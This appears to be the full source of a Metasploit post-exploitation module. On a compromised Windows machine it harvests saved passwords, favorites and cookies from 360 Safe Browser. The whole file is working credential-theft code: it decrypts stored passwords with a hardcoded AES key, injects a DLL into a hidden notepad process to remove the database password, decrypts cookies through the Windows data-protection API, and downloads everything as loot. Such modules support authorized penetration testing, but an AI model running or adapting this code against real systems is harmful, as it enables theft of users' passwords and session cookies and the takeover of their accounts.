##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather360 Safe Browser Password',
        'Description' => %q{
          This module will collect user data from 360 Safe Browser and attempt to decrypt
          sensitive information.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' =>
          [
            'Kali-Team', # Original (Meterpreter script)
          ]
      )
    )

    register_options(
      [
        OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
      ]
    )
  end

  def decrypt_password(data)
    key_digest = "\x63\x66\x36\x36\x66\x62\x35\x38\x66\x35\x63\x61\x33\x34\x38\x35"
    cipher = OpenSSL::Cipher.new('aes-128-ecb')
    cipher.decrypt
    cipher.key = key_digest
    cipher.padding = 0
    ciphertext = cipher.update(data) + cipher.final
    password = ''
    (0..ciphertext.length).step(2) do |i|
      ciphertext[0].eql?("\x01") ? password += ciphertext[i].to_s : password += ciphertext[i - 1].to_s
    end
    return password.to_s
  end

  def inject_dll(process, dll_path)
    library_path = ::File.expand_path(dll_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def remove_password
    print_status('==> Removing database password...')
    dll_path = File.join(Msf::Config.data_directory, 'post', '360', 'remove_password.dll')
    notepad_pathname = get_notepad_pathname(ARCH_X86, client.sys.config.getenv('windir'), client.arch)
    notepad_process = client.sys.process.execute(notepad_pathname, nil, 'Hidden' => true)
    hprocess = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    exploit_mem, offset = inject_dll(hprocess, dll_path)
    hprocess.thread.create(exploit_mem + offset)
    sleep(5)
    client.sys.process.kill(hprocess.pid)
  end

  def decrypt_data(data)
    rg = session.railgun
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(1024)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'

      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')

    else

      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')

    end

    return '' if len == 0

    decrypted = process.memory.read(addr, len)
    return decrypted
  end

  def check_360_win(appdatapath)
    tbl = []
    favorite_tbl = []
    db_list = session.fs.file.search(appdatapath, 'assis2.db')
    if !db_list.empty?
      db_list.each do |item|
        file_name = item['path'] + session.fs.file.separator + item['name']
        db_file_name = 'C:\\assis2.db'
        session.fs.file.copy(file_name, db_file_name)
        remove_password
        print_status('==> Downloading database...')
        local_path = store_loot('360.safebrowser', 'application/x-sqlite3', session, read_file(db_file_name), item['name'], 'SafeBrowser database')
        session.fs.file.download_file(local_path, db_file_name)
        print_good("==> Downloaded to #{local_path}")
        db = SQLite3::Database.new(local_path)
        result = db.execute('select domain, username, password from tb_account;')
        favorite_result = db.execute('select domain, url, title, username from tb_favorite;')
        db.close
        for row in result
          bs64 = row[2].split(')')[1].to_s
          enc_pw = Rex::Text.decode_base64(bs64)
          pw = decrypt_password(enc_pw)
          tbl << {
            domain: row[0],
            username: row[1],
            password: pw
          }
        end
        for row in favorite_result
          favorite_tbl << {
            domain: row[0],
            url: row[1],
            title: row[2],
            username: row[3]
          }
        end
      end
    else
      print_warning('360 safebrowser database not exist!')
    end
    return tbl, favorite_tbl
  end

  def gather_cookies(appdatapath)
    cookies_path = "#{appdatapath}\\360se6\\User Data\\Default\\Cookies"
    print_status('==> Downloading cookies...')
    local_path = store_loot('360.safebrowser', 'application/x-sqlite3', session, read_file(cookies_path), 'cookie.db', 'cookies')
    session.fs.file.download_file(local_path, cookies_path)
    print_good("==> Downloaded to #{local_path}")
    db = SQLite3::Database.new(local_path)
    columns, *rows = db.execute2('select * from cookies;')
    db.close
    cookies_tbl = Rex::Text::Table.new(
      'Header' => '360 safe browser cookies',
      'Columns' => columns
    )
    rows.map! do |row|
      res = Hash[*columns.zip(row).flatten]
      begin
        res['encrypted_value'] = decrypt_data(res['encrypted_value'])
      rescue Encoding::InvalidByteSequenceError => e
        res['encrypted_value'] = ''
        print_error(e.to_s)
      end
      cookies_tbl << res.values
    end
    if cookies_tbl.rows.length
      path = store_loot('360 decrypted Cookies', 'text/plain', session, cookies_tbl.to_s, 'decrypted_360_Cookies.txt', 'Decrypted 360 Cookie')
      print_good("Decrypted Cookies saved in: #{path}")
    end
  end

  def run
    result = []
    favorite_result = []
    columns = [
      'Domain',
      'UserName',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => '360 Safe Browser Password',
      'Columns' => columns
    )
    favorite_columns = [
      'Domain',
      'Url',
      'Title',
      'Username'
    ]
    favorite_tbl = Rex::Text::Table.new(
      'Header' => '360 SafeBrowser Favorite',
      'Columns' => favorite_columns
    )
    print_status("Gather 360 Safe Browser Password on #{sysinfo['Computer']}")
    # https://docs.microsoft.com/zh-cn/windows/win32/winprog64/accessing-an-alternate-registry-view?redirectedfrom=MSDN
    grab_user_profiles.each do |user|
      last_install_path = registry_getvaldata("HKEY_USERS\\#{user['SID']}\\Software\\360\\360se6\\Chrome", 'last_install_path')
      next if last_install_path.nil?

      result, favorite_result = check_360_win(last_install_path)
      result.each do |item|
        tbl << item.values
      end
      print_line(tbl.to_s) if !tbl.rows.empty?
      favorite_result.each do |item|
        favorite_tbl << item.values
      end
      print_line(favorite_tbl.to_s) if !favorite_tbl.rows.empty?

      gather_cookies(last_install_path)
    end

  end
end
